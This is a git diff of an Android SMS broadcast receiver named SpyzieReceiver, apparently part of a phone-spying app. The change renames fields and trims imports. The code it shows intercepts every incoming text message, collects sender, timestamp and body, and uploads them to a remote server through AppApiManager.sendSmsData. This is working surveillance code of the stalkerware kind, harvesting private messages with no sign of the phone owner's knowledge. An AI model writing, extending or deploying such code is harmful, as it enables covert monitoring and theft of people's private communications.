@@ -5,14 +5,9 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
-import android.util.Log;
-import android.widget.Toast;
 
 import com.tantd.spyzie.data.model.Sms;
 import com.tantd.spyzie.data.network.AppApiManager;
-import com.tantd.spyzie.util.Constants;
-
-import java.util.Date;
 
 public class SpyzieReceiver extends BroadcastReceiver {
 
@@ -26,13 +21,14 @@ public class SpyzieReceiver extends BroadcastReceiver {
         for (int i = 0; i < pdus.length; i++) {
             smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
             if (i == 0) {
-                sms.sender = smsMessage.getDisplayOriginatingAddress();
-                sms.time = smsMessage.getTimestampMillis();
-                sb.append("Phone: " + sms.sender);
+                sms.address = smsMessage.getDisplayOriginatingAddress();
+                sms.time = String.valueOf(smsMessage.getTimestampMillis());
+                sb.append("Phone: " + sms.address);
             }
             sb.append(", Message: " + smsMessage.getMessageBody());
         }
-        sms.content = sb.toString();
+        sms.body = sb.toString();
+        sms.isIncoming = true;
         AppApiManager.getInstance().sendSmsData(sms);
     }
 }
